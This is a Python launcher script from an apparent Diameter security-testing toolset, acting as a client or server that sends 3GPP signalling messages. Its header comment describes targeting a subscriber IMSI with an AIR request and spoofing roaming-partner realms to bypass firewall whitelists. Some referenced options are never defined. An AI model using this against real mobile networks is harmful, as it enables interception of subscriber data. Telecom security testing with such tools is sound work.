#!/usr/bin/env  python
# -*- coding: utf-8 -*-

#       interception.py
#       
#       Copyright 2018 Rosalia d'Alessandro <list_mailing@libero.it>
#                     
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

###################### REMEMBER ########################################## 
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/lib/libcrc32c.ko
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/net/sctp/sctp.ko
#echo 1 > /proc/sys/net/sctp/max_init_retransmits
########################################################################## 

from optparse import OptionParser
import os
import sys

from diameter_core.core.utilities import configList, parseConfigs
import IPy
from core.client_listener import ClientListener
from core.server_listener import ServerListener
import signal
from core.loader import PluginLoader
from core.commons import logOk, logWarn, logErr, logNormal

##
## DIAMETER_TOOLSET v2.1
## 
## @brief      Main file to execute the script.
## 
## This is the only file to be executed for all the tests on the 3GPP's DIAMETER protocol messages
## 
## Use the -h option to enter the help menu and determine what to do.
## 
## Basic usage examples:
## act as a client connecting to <remote-host-ip>
##    python interception.py -svt client -c <conf_file> <remote-host-ip>      
## act as a server and accept connection only from <accept-ip>. the <remote-host-ip> 
##   is your local IP      
##     python interception.py -svt server -c <conf file>-a <accept-ip> 
##      <remote-host-ip>      
## conf files:
##
##    * interception_air.cnf :  AIR message
##      - The AVP Username must be set to the target IMSI
##      - The AVP Origin-Realm and Origin-Host can set to a valid roaming partner 
##        in order to bypass FW whitelists
##      - Host-IP must be set
##      - Destination-Realm and Destination-Host must be set to the realm of the network 
##        to which the IMSI belongs


VERSION = "2.1"
DIAMETER_PORT = 3868
DEFAULT_MSG_FREQ = 20
DEFAULT_SLEEPTIME = 1

parser = OptionParser(usage="usage: %s [options] address[/net]" % os.path.basename(sys.argv[0]), version=VERSION)
parser.add_option("-t", "--type",
        dest="type", default="client", help=("set the type it will act "
                                    "(client|server) [default: %default]"))
parser.add_option("-a", "--accept",
        dest="server_accepted", action='append', 
        help="accept connection only from specified address")
parser.add_option("-c", "--config",
        dest="config_file", help="the configuration file")
parser.add_option("-m", "--msg-freq",
        dest="msg_freq", default=DEFAULT_SLEEPTIME, metavar='FREQUENCY', 
        help=("determine the frequency of the messages. Set the sleep time "
              "between each message [default: %default]"))
parser.add_option("-d", "--sleep-time",
       dest="sleep_time", default=DEFAULT_MSG_FREQ, metavar='TIME', 
       help=("set the sleep time before start sending messages, it is the "
             "negotiation time [default: %default]"))
parser.add_option("-s", "--sctp", dest="is_sctp", action="store_true", 
        default=False, help="use SCTP for transport, instead of TCP")
parser.add_option("-v", "--verbose",
        dest="is_verbose", action="store_true", default=False, help=("set if is "
        "verbose [default: %default]"))
parser.add_option("-p", "--port",
        dest="port", default=DIAMETER_PORT, help=("sctp/tcp port used for "
        "client or server connections"))



(options, args) = parser.parse_args()

TAG_NAME = 'DIAMETER_TOOLSET'

is_verbose = options.is_verbose
is_fuzzy = options.is_fuzzy
is_raw = options.is_raw
is_sctp = options.is_sctp
msg_freq = float(options.msg_freq)
sleep_time = float(options.sleep_time)
port = int(options.port)

if options.cnf_list:
    configList(options.cnf_list)
    sys.exit(0)
    
if len(args) != 1:
    logErr(("Incorrect number of arguments. There must be only one extra "
            "argument (the IP)"), TAG_NAME)

try:
    ip = IPy.IP(args[0])
except Exception as e:
    logErr("Invalid argument %s: %s" % (args[0], e), TAG_NAME)
    sys.exit(1)

if options.type:
    options.type = options.type.lower()
    if options.type == "c":     options.type = "client"
    elif options.type == "s":   options.type = "server"

if not options.config_file:
    logErr("Config file not given", TAG_NAME)

server_accepted = None
if options.server_accepted and options.server_accepted!=[]:
    server_accepted = []
    for saip in options.server_accepted:
        try:
            ipy_saip = IPy.IP(saip)
            for saip in ipy_saip:
                server_accepted.append(saip.strNormal(0))
        except Exception as e:
            logWarn("Invalid Accepted IP [%s]" % (saip), TAG_NAME)
            pass

connection_address = (ip.strNormal(0), port)

# load and parse config file
config = parseConfigs(options.config_file)

# istantiate PluginLoader class
loader = PluginLoader(config)

try:
    common_messages = loader.callPlugin('common')
except Exception as e:
    logErr("COMMON_MESSAGES_ERROR: %s" % (e), TAG_NAME)
    sys.exit(1)

msgs = []
app_id_conf = config['interface'].lower()

try:
    msgs = loader.callPlugin('%s_3gpp' % (app_id_conf))
except Exception as e:
    logErr("Unknown interface %s [%s]" % (app_id_conf, e), TAG_NAME)
    sys.exit(1)
    
if is_verbose:
    logNormal("The test will be performed on:", TAG_NAME)    
    if len(msgs) > 0 : logNormal("    %d normal messages" % (len(msgs)), TAG_NAME)

lstn = None

try:
    dwa = common_messages[280]["answer"] 
except KeyError as e:
    logErr("The DWA message is needed! Exit!", TAG_NAME)
    sys.exit(1)
except Exception as e:
    logErr("ERROR: ", TAG_NAME, False)
    print(e)
    sys.exit(1)

if options.type == "client":
    try:
        cer = common_messages[257]["request"] 
    except KeyError as e:
        logErr("The CLIENT needs the CER message! Exit!", TAG_NAME)
        sys.exit(1)
    except Exception as e:
        logErr("ERROR: ", TAG_NAME, False)
        print(e)
        sys.exit(1)
    
    print("\n--: Acting as CLIENT :--")
       
    lstn = ClientListener(connection_address, msgs, cer, dwa,
                          is_sctp, is_verbose, msg_freq, sleep_time)

elif options.type == "server":
    try:
        cea = common_messages[257]["answer"]
    except KeyError as e:
        logErr("The SERVER needs the CEA message! Exit!", TAG_NAME)
        sys.exit(1)
    except Exception as e:
        logErr("ERROR: ", TAG_NAME, False)
        print(e)
        sys.exit(1)
       
    print("\n--: Acting as SERVER :--")
    lstn = ServerListener(connection_address, msgs, cea, dwa,
                          server_accepted, is_sctp, is_verbose, msg_freq, sleep_time)

else :
    logErr("Supported mode: client or server, not %s Exit!" % (options.type), TAG_NAME)
    sys.exit(1)    
lstn.daemon = True
lstn.start()
lstn.join()
lstn.stop()

def smooth_exit(signal, data):
    print("\n")
    logNormal("Closing the %s session...." % (options.type), TAG_NAME, False)
    if lstn is not None:
        lstn.stop()
    logOk("DONE!")
    sys.exit(0)
    

if __name__ == '__main__':
    signal.signal(signal.SIGQUIT, smooth_exit)
    signal.signal(signal.SIGINT, smooth_exit)
    signal.signal(signal.SIGTERM, smooth_exit)
    
    while True:
        signal.pause()